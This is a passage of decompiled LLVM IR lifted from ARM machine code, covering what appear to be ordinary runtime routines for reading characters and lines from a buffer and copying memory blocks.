  store i32 %v3_172f4, i32* %r2.global-to-local, align 4
  %v1_172f8 = and i32 %v3_172f4, 2
  %v2_172f8 = icmp eq i32 %v1_172f8, 0
  br i1 %v2_172f8, label %dec_label_pc_17324, label %dec_label_pc_17300

dec_label_pc_17300:                               ; preds = %dec_label_pc_172f4
  %tmp25 = urem i16 %v2_172f4, 2
  %v1_17300 = zext i16 %tmp25 to i32
  %tmp21 = sub nsw i32 0, %v1_17300
  %v4_17304 = and i32 %tmp21, 4
  %v5_17304 = add i32 %v4_17304, %v2_17334
  %v1_17308 = add i32 %v5_17304, 36
  %v2_17308 = inttoptr i32 %v1_17308 to i8*
  %v3_17308 = load i8, i8* %v2_17308, align 1
  %v4_17308 = zext i8 %v3_17308 to i32
  %v1_1730c = add nsw i32 %v3_172f4, -1
  store i32 %v1_1730c, i32* %r2.global-to-local, align 4
  store i32 %v4_17308, i32* %r0.global-to-local, align 4
  %v2_17318 = add i32 %v2_17334, 40
  %v3_17318 = inttoptr i32 %v2_17318 to i32*
  store i32 0, i32* %v3_17318, align 4
  %v0_1731c = load i32, i32* %r2.global-to-local, align 4
  %v1_1731c = trunc i32 %v0_1731c to i16
  %v2_1731c = load i32, i32* @r4, align 4
  %v3_1731c = inttoptr i32 %v2_1731c to i16*
  store i16 %v1_1731c, i16* %v3_1731c, align 2
  br label %dec_label_pc_173c0

dec_label_pc_17324:                               ; preds = %dec_label_pc_172f4
  %v1_17324 = add i32 %v2_17334, 16
  %v1_17328 = inttoptr i32 %v1_17324 to i32*
  %v2_17328 = load i32, i32* %v1_17328, align 4
  %v3_17328 = add i32 %v2_17334, 20
  %v4_17328 = inttoptr i32 %v3_17328 to i32*
  %v5_17328 = load i32, i32* %v4_17328, align 4
  %v9_1732c = icmp eq i32 %v5_17328, %v2_17328
  br i1 %v9_1732c, label %dec_label_pc_1733c, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_17324
  %v2_17330 = inttoptr i32 %v2_17328 to i8*
  %v3_17330 = load i8, i8* %v2_17330, align 1
  %v4_17330 = zext i8 %v3_17330 to i32
  store i32 %v4_17330, i32* %r0.global-to-local, align 4
  %v6_17330 = add i32 %v2_17328, 1
  store i32 %v6_17330, i32* %v1_17328, align 4
  br label %dec_label_pc_173c0

dec_label_pc_1733c:                               ; preds = %dec_label_pc_17324
  %v1_1733c = add i32 %v2_17334, 4
  %v2_1733c = inttoptr i32 %v1_1733c to i32*
  %v3_1733c = load i32, i32* %v2_1733c, align 4
  %v7_17340 = icmp eq i32 %v3_1733c, -2
  br i1 %v7_17340, label %.thread8, label %dec_label_pc_17354

.thread8:                                         ; preds = %dec_label_pc_1733c
  %v2_17344 = or i16 %v2_172f4, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_17344, i16* %v1_172f4, align 2
  br label %dec_label_pc_173c0

dec_label_pc_17354:                               ; preds = %dec_label_pc_1733c
  %v1_17354 = and i32 %v3_172f4, 768
  %v2_17354 = icmp eq i32 %v1_17354, 0
  br i1 %v2_17354, label %.thread10, label %bb22

bb22:                                             ; preds = %dec_label_pc_17354
  %v1_1735c = load i32, i32* @r5, align 4
  %v3_1735c = add i32 %v1_1735c, 48
  %v4_1735c = inttoptr i32 %v3_1735c to i32*
  %v5_1735c = load i32, i32* %v4_1735c, align 4
  store i32 %v5_1735c, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_17354, %bb22
  %v1_17360 = xor i1 %v2_17354, true
  call void @__pseudo_cond_branch(i1 %v1_17360, i32 ptrtoint (i32* @global_var_1709c.443 to i32))
  %v0_17364 = load i32, i32* @r4, align 4
  %v1_17364 = add i32 %v0_17364, 8
  store i32 %v1_17364, i32* %r2.global-to-local, align 4
  %v1_17368 = inttoptr i32 %v1_17364 to i32*
  %v2_17368 = load i32, i32* %v1_17368, align 4
  store i32 %v2_17368, i32* %r2.global-to-local, align 4
  %v3_17368 = add i32 %v0_17364, 12
  %v4_17368 = inttoptr i32 %v3_17368 to i32*
  %v5_17368 = load i32, i32* %v4_17368, align 4
  %v9_1736c = icmp eq i32 %v5_17368, %v2_17368
  br i1 %v9_1736c, label %dec_label_pc_173a0, label %dec_label_pc_17374

dec_label_pc_17374:                               ; preds = %.thread10
  %v2_17374 = add i32 %v0_17364, 24
  %v3_17374 = inttoptr i32 %v2_17374 to i32*
  store i32 %v2_17368, i32* %v3_17374, align 4
  %v0_17378 = load i32, i32* @r4, align 4
  store i32 %v0_17378, i32* %r0.global-to-local, align 4
  %v2_1737c = call i32 @function_18b44(i32 %v0_17378)
  store i32 %v2_1737c, i32* %r0.global-to-local, align 4
  %v2_17380 = icmp eq i32 %v2_1737c, 0
  br i1 %v2_17380, label %dec_label_pc_173bc, label %dec_label_pc_17388

dec_label_pc_17388:                               ; preds = %dec_label_pc_17374
  %v0_17388 = load i32, i32* @r4, align 4
  %v1_17388 = add i32 %v0_17388, 20
  %v2_17388 = inttoptr i32 %v1_17388 to i32*
  %v3_17388 = load i32, i32* %v2_17388, align 4
  %v2_1738c = add i32 %v0_17388, 24
  %v3_1738c = inttoptr i32 %v2_1738c to i32*
  store i32 %v3_17388, i32* %v3_1738c, align 4
  %v0_17390 = load i32, i32* @r4, align 4
  %v1_17390 = add i32 %v0_17390, 16
  %v2_17390 = inttoptr i32 %v1_17390 to i32*
  %v3_17390 = load i32, i32* %v2_17390, align 4
  %v1_17394 = inttoptr i32 %v3_17390 to i8*
  %v2_17394 = load i8, i8* %v1_17394, align 1
  %v3_17394 = zext i8 %v2_17394 to i32
  store i32 %v3_17394, i32* %r0.global-to-local, align 4
  %v5_17394 = add i32 %v3_17390, 1
  store i32 %v5_17394, i32* %v2_17390, align 4
  br label %dec_label_pc_173c0

dec_label_pc_173a0:                               ; preds = %.thread10
  %v1_173a0 = inttoptr i32 %v0_17364 to i16*
  store i32 %v0_17364, i32* %r0.global-to-local, align 4
  %v2_173a4 = ptrtoint i8* %stack_var_-17 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_173ac = call i32 @function_18a28(i16* %v1_173a0, i32 %v2_173a4, i32 1)
  store i32 %v5_173ac, i32* %r0.global-to-local, align 4
  %v2_173b0 = icmp eq i32 %v5_173ac, 0
  br i1 %v2_173b0, label %dec_label_pc_173bc, label %bb23

bb23:                                             ; preds = %dec_label_pc_173a0
  %v4_173b4 = load i8, i8* %stack_var_-17, align 1
  %v5_173b4 = sext i8 %v4_173b4 to i32
  store i32 %v5_173b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_173c0

dec_label_pc_173bc:                               ; preds = %dec_label_pc_173a0, %dec_label_pc_172e4, %dec_label_pc_17374
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_173c0

dec_label_pc_173c0:                               ; preds = %bb, %.thread8, %bb23, %.thread5, %dec_label_pc_17388, %dec_label_pc_17300, %dec_label_pc_173bc
  %v2_173c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_173c4, i32* @r4, align 4
  store i32 %v6_172a8, i32* @r5, align 4
  store i32 %v9_172a8, i32* @lr, align 4
  %v1_173c8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_173c8

; uselistorder directives
  uselistorder i32 %v2_17328, { 1, 0, 2 }
  uselistorder i32 %v2_17334, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_172ac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_172ac, { 1, 0, 2, 3, 4 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 9, 1, 0, 11, 3, 2, 12, 4, 5, 6, 7, 8, 13, 10 }
  uselistorder label %dec_label_pc_173c0, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_173bc, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_173d4(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_173d4:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_173d4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_173d8 = icmp eq i32 %arg2, 0
  store i1 %v2_173d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_17460, label %dec_label_pc_17448.preheader

dec_label_pc_17448.preheader:                     ; preds = %dec_label_pc_173d4
  store i32 %tmp, i32* @r5, align 4
  %v1_174482 = add i32 %arg2, -1
  store i32 %v1_174482, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_174488 = icmp eq i32 %arg2, 1
  store i1 %v7_174488, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_174488, label %dec_label_pc_17450, label %dec_label_pc_173f4

dec_label_pc_173f4:                               ; preds = %dec_label_pc_17448.preheader, %dec_label_pc_17448.backedge.dec_label_pc_173f4_crit_edge
  %v0_17418 = phi i32 [ %v0_173f4.pre, %dec_label_pc_17448.backedge.dec_label_pc_173f4_crit_edge ], [ %arg3, %dec_label_pc_17448.preheader ]
  %v1_173f4 = add i32 %v0_17418, 16
  %v2_173f4 = inttoptr i32 %v1_173f4 to i32*
  %v3_173f4 = load i32, i32* %v2_173f4, align 4
  store i32 %v3_173f4, i32* %r2.global-to-local, align 4
  %v1_173f8 = add i32 %v0_17418, 24
  %v2_173f8 = inttoptr i32 %v1_173f8 to i32*
  %v3_173f8 = load i32, i32* %v2_173f8, align 4
  store i32 %v3_173f8, i32* %r3.global-to-local, align 4
  %v3_173fc = icmp uge i32 %v3_173f4, %v3_173f8
  store i1 %v3_173fc, i1* %cpsr_c.global-to-local, align 1
  %v9_173fc = icmp eq i32 %v3_173f4, %v3_173f8
  store i1 %v9_173fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_173fc, label %dec_label_pc_17418, label %dec_label_pc_17404

dec_label_pc_17404:                               ; preds = %dec_label_pc_173f4
  %v1_17404 = inttoptr i32 %v3_173f4 to i8*
  %v2_17404 = load i8, i8* %v1_17404, align 1
  %v3_17404 = zext i8 %v2_17404 to i32
  store i32 %v3_17404, i32* %r3.global-to-local, align 4
  %v5_17404 = add i32 %v3_173f4, 1
  store i32 %v5_17404, i32* %r2.global-to-local, align 4
  %v2_17408 = load i32, i32* @r5, align 4
  %v3_17408 = inttoptr i32 %v2_17408 to i8*
  store i8 %v2_17404, i8* %v3_17408, align 1
  %v4_17408 = load i32, i32* @r5, align 4
  %v5_17408 = add i32 %v4_17408, 1
  store i32 %v5_17408, i32* @r5, align 4
  %v0_1740c = load i32, i32* %r3.global-to-local, align 4
  %v2_1740c = icmp ugt i32 %v0_1740c, 9
  store i1 %v2_1740c, i1* %cpsr_c.global-to-local, align 1
  %v7_1740c = icmp eq i32 %v0_1740c, 10
  store i1 %v7_1740c, i1* %cpsr_z.global-to-local, align 1
  %v0_17410 = load i32, i32* %r2.global-to-local, align 4
  %v1_17410 = load i32, i32* @r4, align 4
  %v2_17410 = add i32 %v1_17410, 16
  %v3_17410 = inttoptr i32 %v2_17410 to i32*
  store i32 %v0_17410, i32* %v3_17410, align 4
  br i1 %v7_1740c, label %dec_label_pc_17450, label %dec_label_pc_17448.backedge

dec_label_pc_17418:                               ; preds = %dec_label_pc_173f4
  %v1_17418 = inttoptr i32 %v0_17418 to i16*
  %v3_1741c = call i32 @function_172a8(i16* %v1_17418)
  %v3_17420 = icmp eq i32 %v3_1741c, -1
  store i1 %v3_17420, i1* %cpsr_c.global-to-local, align 1
  %v8_17420 = icmp eq i32 %v3_1741c, -1
  store i1 %v8_17420, i1* %cpsr_z.global-to-local, align 1
  %v1_17424 = urem i32 %v3_1741c, 256
  store i32 %v1_17424, i32* %r3.global-to-local, align 4
  br i1 %v3_17420, label %dec_label_pc_1742c, label %dec_label_pc_17444

dec_label_pc_1742c:                               ; preds = %dec_label_pc_17418
  %v0_1742c = load i32, i32* @r4, align 4
  %v1_1742c = inttoptr i32 %v0_1742c to i16*
  %v2_1742c = load i16, i16* %v1_1742c, align 2
  %v3_1742c = zext i16 %v2_1742c to i32
  store i32 %v3_1742c, i32* %r3.global-to-local, align 4
  %v1_17430 = and i32 %v3_1742c, 8
  %v2_17430 = icmp eq i32 %v1_17430, 0
  store i1 %v2_17430, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17430, label %dec_label_pc_17450, label %dec_label_pc_17460

dec_label_pc_17444:                               ; preds = %dec_label_pc_17418
  %v1_1743c = trunc i32 %v3_1741c to i8
  %v2_1743c = load i32, i32* @r5, align 4
  %v3_1743c = inttoptr i32 %v2_1743c to i8*
  store i8 %v1_1743c, i8* %v3_1743c, align 1
  %v4_1743c = load i32, i32* @r5, align 4
  %v5_1743c = add i32 %v4_1743c, 1
  store i32 %v5_1743c, i32* @r5, align 4
  %v0_17440 = load i32, i32* %r3.global-to-local, align 4
  %v2_17440 = icmp ugt i32 %v0_17440, 9
  store i1 %v2_17440, i1* %cpsr_c.global-to-local, align 1
  %v7_17440 = icmp eq i32 %v0_17440, 10
  store i1 %v7_17440, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17440, label %dec_label_pc_17450, label %dec_label_pc_17448.backedge

dec_label_pc_17448.backedge:                      ; preds = %dec_label_pc_17444, %dec_label_pc_17404
  %v0_17448 = load i32, i32* %r6.global-to-local, align 4
  %v1_17448 = add i32 %v0_17448, -1
  store i32 %v1_17448, i32* %r6.global-to-local, align 4
  %v2_17448 = icmp ne i32 %v0_17448, 0
  store i1 %v2_17448, i1* %cpsr_c.global-to-local, align 1
  %v7_17448 = icmp eq i32 %v0_17448, 1
  store i1 %v7_17448, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17448, label %dec_label_pc_17450, label %dec_label_pc_17448.backedge.dec_label_pc_173f4_crit_edge

dec_label_pc_17448.backedge.dec_label_pc_173f4_crit_edge: ; preds = %dec_label_pc_17448.backedge
  %v0_173f4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_173f4

dec_label_pc_17450:                               ; preds = %dec_label_pc_17444, %dec_label_pc_17448.backedge, %dec_label_pc_17404, %dec_label_pc_17448.preheader, %dec_label_pc_1742c
  %v0_17450 = load i32, i32* @r5, align 4
  %v1_17450 = load i32, i32* @r7, align 4
  %v3_17450 = icmp uge i32 %v0_17450, %v1_17450
  store i1 %v3_17450, i1* %cpsr_c.global-to-local, align 1
  %v9_17450 = icmp eq i32 %v0_17450, %v1_17450
  store i1 %v9_17450, i1* %cpsr_z.global-to-local, align 1
  %v2_17454 = xor i1 %v9_17450, true
  %v3_17454 = and i1 %v3_17450, %v2_17454
  br i1 %v3_17454, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_17450
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_17458 = inttoptr i32 %v0_17450 to i8*
  store i8 0, i8* %v7_17458, align 1
  %v0_1745c.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_1745c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_17450, %bb
  %v1_1745c = phi i1 [ %v1_1745c.pre, %bb ], [ %v9_17450, %dec_label_pc_17450 ]
  %v0_1745c = phi i1 [ %v0_1745c.pre, %bb ], [ %v3_17450, %dec_label_pc_17450 ]
  %v2_1745c = xor i1 %v1_1745c, true
  %v3_1745c = and i1 %v0_1745c, %v2_1745c
  br i1 %v3_1745c, label %.dec_label_pc_17464_crit_edge, label %dec_label_pc_17460

.dec_label_pc_17464_crit_edge:                    ; preds = %.thread14
  %v0_17464.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17464

dec_label_pc_17460:                               ; preds = %dec_label_pc_173d4, %dec_label_pc_1742c, %.thread14
  br label %dec_label_pc_17464

dec_label_pc_17464:                               ; preds = %.dec_label_pc_17464_crit_edge, %dec_label_pc_17460
  %v0_17464 = phi i32 [ %v0_17464.pre, %.dec_label_pc_17464_crit_edge ], [ 0, %dec_label_pc_17460 ]
  store i32 %v6_173d4, i32* @r5, align 4
  ret i32 %v0_17464

; uselistorder directives
  uselistorder i1 %v9_17450, { 1, 0, 2 }
  uselistorder i32 %v1_17450, { 1, 0 }
  uselistorder i32 %v0_17450, { 0, 2, 1 }
  uselistorder i32 %v0_17448, { 2, 0, 1 }
  uselistorder i32 %v0_17440, { 1, 0 }
  uselistorder i32 %v3_1741c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1740c, { 1, 0 }
  uselistorder i32 %v3_173f4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_17418, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_17464, { 1, 0 }
  uselistorder label %dec_label_pc_17460, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_17450, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_173f4, { 1, 0 }
}

define i32 @function_17480() local_unnamed_addr {
dec_label_pc_17480:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_17480 = load i32, i32* @r1, align 4
  %v1_17480 = load i32, i32* @r0, align 4
  %v2_17480 = sub i32 %v0_17480, %v1_17480
  %v3_17480 = icmp ult i32 %v0_17480, %v1_17480
  %v4_17480 = xor i32 %v1_17480, %v0_17480
  %v5_17480 = xor i32 %v2_17480, %v0_17480
  %v6_17480 = and i32 %v5_17480, %v4_17480
  %v7_17480 = icmp slt i32 %v6_17480, 0
  store i1 %v7_17480, i1* %cpsr_v.global-to-local, align 1
  %v8_17480 = icmp slt i32 %v2_17480, 0
  store i1 %v8_17480, i1* %cpsr_n.global-to-local, align 1
  %v9_17480 = icmp eq i32 %v0_17480, %v1_17480
  store i1 %v9_17480, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17480, label %dec_label_pc_176d4, label %dec_label_pc_17488

dec_label_pc_17488:                               ; preds = %dec_label_pc_17480
  br i1 %v9_17480, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_17488
  %merge = phi i32 [ %v0_17480, %dec_label_pc_17488 ], [ %v2_17768, %bb150 ], [ %v11_17784, %bb153 ], [ %v7_17784, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_17488
  %v5_1748c = inttoptr i32 %v1_17480 to i8*
  store i8* %v5_1748c, i8** %stack_var_-8, align 4
  %v8_1748c = load i32, i32* @lr, align 4
  %v0_17490 = load i32, i32* @r2, align 4
  %v2_17490 = add i32 %v0_17490, -4
  store i32 %v2_17490, i32* %r2.global-to-local, align 4
  %v4_17490 = sub i32 3, %v0_17490
  %v5_17490 = and i32 %v4_17490, %v0_17490
  %v6_17490 = icmp slt i32 %v5_17490, 0
  store i1 %v6_17490, i1* %cpsr_v.global-to-local, align 1
  %v7_17490 = icmp slt i32 %v2_17490, 0
  store i1 %v7_17490, i1* %cpsr_n.global-to-local, align 1
  %v8_17490 = icmp eq i32 %v0_17490, 4
  store i1 %v8_17490, i1* %cpsr_z.global-to-local, align 1
  %v5_17494 = icmp slt i32 %v0_17490, 4
  br i1 %v5_17494, label %bb140, label %dec_label_pc_17498

dec_label_pc_17498:                               ; preds = %bb
  %v1_17498 = urem i32 %v1_17480, 4
  store i32 %v1_17498, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17498 = icmp eq i32 %v1_17498, 0
  store i1 %v2_17498, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17498, label %dec_label_pc_174a0, label %dec_label_pc_1754c

dec_label_pc_174a0:                               ; preds = %dec_label_pc_17498
  %v1_174a0 = urem i32 %v0_17480, 4
  store i32 %v1_174a0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_174a0 = icmp eq i32 %v1_174a0, 0
  store i1 %v2_174a0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_17480 to i2
  br i1 %v2_174a0, label %dec_label_pc_174a8, label %dec_label_pc_1757c

dec_label_pc_174a8:                               ; preds = %dec_label_pc_174a0, %dec_label_pc_17574
  %v0_174c094 = phi i32 [ %v1_17480, %dec_label_pc_174a0 ], [ %v0_1769c77, %dec_label_pc_17574 ]
  %v0_174bc93 = phi i32 [ %v0_17480, %dec_label_pc_174a0 ], [ %v0_17574, %dec_label_pc_17574 ]
  %v0_174a8 = phi i32 [ %v2_17490, %dec_label_pc_174a0 ], [ %v2_1756c, %dec_label_pc_17574 ]
  %v1_174a8 = add i32 %v0_174a8, -8
  store i32 %v1_174a8, i32* %r2.global-to-local, align 4
  %v3_174a8 = sub i32 7, %v0_174a8
  %v4_174a8 = and i32 %v3_174a8, %v0_174a8
  %v5_174a8 = icmp slt i32 %v4_174a8, 0
  store i1 %v5_174a8, i1* %cpsr_v.global-to-local, align 1
  %v6_174a8 = icmp slt i32 %v1_174a8, 0
  store i1 %v6_174a8, i1* %cpsr_n.global-to-local, align 1
  %v7_174a8 = icmp eq i32 %v0_174a8, 8
  store i1 %v7_174a8, i1* %cpsr_z.global-to-local, align 1
  %v2_174ac = xor i1 %v6_174a8, %v5_174a8
  br i1 %v2_174ac, label %dec_label_pc_174fc, label %dec_label_pc_174b0

dec_label_pc_174b0:                               ; preds = %dec_label_pc_174a8
  %v1_174b0 = add i32 %v0_174a8, -28
  store i32 %v1_174b0, i32* %r2.global-to-local, align 4
  %v3_174b0 = sub i32 27, %v0_174a8
  %v4_174b0 = and i32 %v3_174b0, %v1_174a8
  %v5_174b0 = icmp slt i32 %v4_174b0, 0
  store i1 %v5_174b0, i1* %cpsr_v.global-to-local, align 1
  %v6_174b0 = icmp slt i32 %v1_174b0, 0
  store i1 %v6_174b0, i1* %cpsr_n.global-to-local, align 1
  %v7_174b0 = icmp eq i32 %v1_174a8, 20
  store i1 %v7_174b0, i1* %cpsr_z.global-to-local, align 1
  %v2_174b4 = xor i1 %v6_174b0, %v5_174b0
  br i1 %v2_174b4, label %dec_label_pc_174e8, label %dec_label_pc_174b8

dec_label_pc_174b8:                               ; preds = %dec_label_pc_174b0
  %v0_174b8 = load i32, i32* @r4, align 4
  store i32 %v0_174b8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_174bc

dec_label_pc_174bc:                               ; preds = %dec_label_pc_174bc.dec_label_pc_174bc_crit_edge, %dec_label_pc_174b8
  %v0_174c0 = phi i32 [ %v12_174c8, %dec_label_pc_174bc.dec_label_pc_174bc_crit_edge ], [ %v0_174c094, %dec_label_pc_174b8 ]
  %v0_174bc = phi i32 [ %v0_174bc.pre, %dec_label_pc_174bc.dec_label_pc_174bc_crit_edge ], [ %v0_174bc93, %dec_label_pc_174b8 ]
  %v1_174bc = inttoptr i32 %v0_174bc to i32*
  %v2_174bc = load i32, i32* %v1_174bc, align 4
  %v3_174bc = add i32 %v0_174bc, 4
  %v4_174bc = inttoptr i32 %v3_174bc to i32*
  %v5_174bc = load i32, i32* %v4_174bc, align 4
  store i32 %v5_174bc, i32* %r4.global-to-local, align 4
  %v6_174bc = add i32 %v0_174bc, 8
  %v7_174bc = inttoptr i32 %v6_174bc to i32*
  %v8_174bc = load i32, i32* %v7_174bc, align 4
  store i32 %v8_174bc, i32* %ip.global-to-local, align 4
  %v9_174bc = add i32 %v0_174bc, 12
  %v10_174bc = inttoptr i32 %v9_174bc to i32*
  %v11_174bc = load i32, i32* %v10_174bc, align 4
  store i32 %v11_174bc, i32* %lr.global-to-local, align 4
  %v12_174bc = add i32 %v0_174bc, 16
  store i32 %v12_174bc, i32* %r1.global-to-local, align 4
  %v1_174c0 = inttoptr i32 %v0_174c0 to i32*
  store i32 %v2_174bc, i32* %v1_174c0, align 4
  %v3_174c0 = add i32 %v0_174c0, 4
  %v4_174c0 = inttoptr i32 %v3_174c0 to i32*
  %v5_174c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_174c0, i32* %v4_174c0, align 4
  %v6_174c0 = add i32 %v0_174c0, 8
  %v7_174c0 = inttoptr i32 %v6_174c0 to i32*
  %v8_174c0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_174c0, i32* %v7_174c0, align 4
  %v9_174c0 = add i32 %v0_174c0, 12
  %v10_174c0 = inttoptr i32 %v9_174c0 to i32*
  %v11_174c0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_174c0, i32* %v10_174c0, align 4
  %v12_174c0 = add i32 %v0_174c0, 16
  store i32 %v12_174c0, i32* %r0.global-to-local, align 4
  %v0_174c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_174c4 = inttoptr i32 %v0_174c4 to i32*
  %v2_174c4 = load i32, i32* %v1_174c4, align 4
  store i32 %v2_174c4, i32* @r3, align 4
  %v3_174c4 = add i32 %v0_174c4, 4
  %v4_174c4 = inttoptr i32 %v3_174c4 to i32*
  %v5_174c4 = load i32, i32* %v4_174c4, align 4
  store i32 %v5_174c4, i32* %r4.global-to-local, align 4
  %v6_174c4 = add i32 %v0_174c4, 8
  %v7_174c4 = inttoptr i32 %v6_174c4 to i32*
  %v8_174c4 = load i32, i32* %v7_174c4, align 4
  store i32 %v8_174c4, i32* @ip, align 4
  %v9_174c4 = add i32 %v0_174c4, 12
  %v10_174c4 = inttoptr i32 %v9_174c4 to i32*
  %v11_174c4 = load i32, i32* %v10_174c4, align 4
  store i32 %v11_174c4, i32* %lr.global-to-local, align 4
  %v12_174c4 = add i32 %v0_174c4, 16
  store i32 %v12_174c4, i32* @r1, align 4
  %v1_174c8 = inttoptr i32 %v12_174c0 to i32*
  store i32 %v2_174c4, i32* %v1_174c8, align 4
  %v3_174c8 = add i32 %v0_174c0, 20
  %v4_174c8 = inttoptr i32 %v3_174c8 to i32*
  %v5_174c8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_174c8, i32* %v4_174c8, align 4
  %v6_174c8 = add i32 %v0_174c0, 24
  %v7_174c8 = inttoptr i32 %v6_174c8 to i32*
  %v8_174c8 = load i32, i32* @ip, align 4
  store i32 %v8_174c8, i32* %v7_174c8, align 4
  %v9_174c8 = add i32 %v0_174c0, 28
  %v10_174c8 = inttoptr i32 %v9_174c8 to i32*
  %v11_174c8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_174c8, i32* %v10_174c8, align 4
  %v12_174c8 = add i32 %v0_174c0, 32
  store i32 %v12_174c8, i32* @r0, align 4
  %v0_174cc = load i32, i32* %r2.global-to-local, align 4
  %v1_174cc = add i32 %v0_174cc, -32
  store i32 %v1_174cc, i32* %r2.global-to-local, align 4
  %v3_174cc = sub i32 31, %v0_174cc
  %v4_174cc = and i32 %v3_174cc, %v0_174cc
  %v5_174cc = icmp slt i32 %v4_174cc, 0
  %v6_174cc = icmp slt i32 %v1_174cc, 0
  %v2_174d0 = xor i1 %v6_174cc, %v5_174cc
  br i1 %v2_174d0, label %dec_label_pc_174d4, label %dec_label_pc_174bc.dec_label_pc_174bc_crit_edge

dec_label_pc_174bc.dec_label_pc_174bc_crit_edge:  ; preds = %dec_label_pc_174bc
  %v0_174bc.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_174bc

dec_label_pc_174d4:                               ; preds = %dec_label_pc_174bc
  %v1_174d4 = add i32 %v0_174cc, -16
  %v3_174d4 = add i32 %v0_174cc, 2147483616
  %v4_174d4 = and i32 %v1_174d4, %v3_174d4
  %v5_174d4 = icmp slt i32 %v4_174d4, 0
  store i1 %v5_174d4, i1* %cpsr_v.global-to-local, align 1
  %v6_174d4 = icmp slt i32 %v1_174d4, 0
  store i1 %v6_174d4, i1* %cpsr_n.global-to-local, align 1
  %v7_174d4 = icmp eq i32 %v1_174d4, 0
  store i1 %v7_174d4, i1* %cpsr_z.global-to-local, align 1
  %v2_174d8 = xor i1 %v6_174d4, %v5_174d4
  br i1 %v2_174d8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_174d4
  %v3_174d8 = load i32, i32* @r1, align 4
  %v4_174d8 = inttoptr i32 %v3_174d8 to i32*
  %v5_174d8 = load i32, i32* %v4_174d8, align 4
  store i32 %v5_174d8, i32* @r3, align 4
  %v6_174d8 = add i32 %v3_174d8, 4
  %v7_174d8 = inttoptr i32 %v6_174d8 to i32*
  %v8_174d8 = load i32, i32* %v7_174d8, align 4
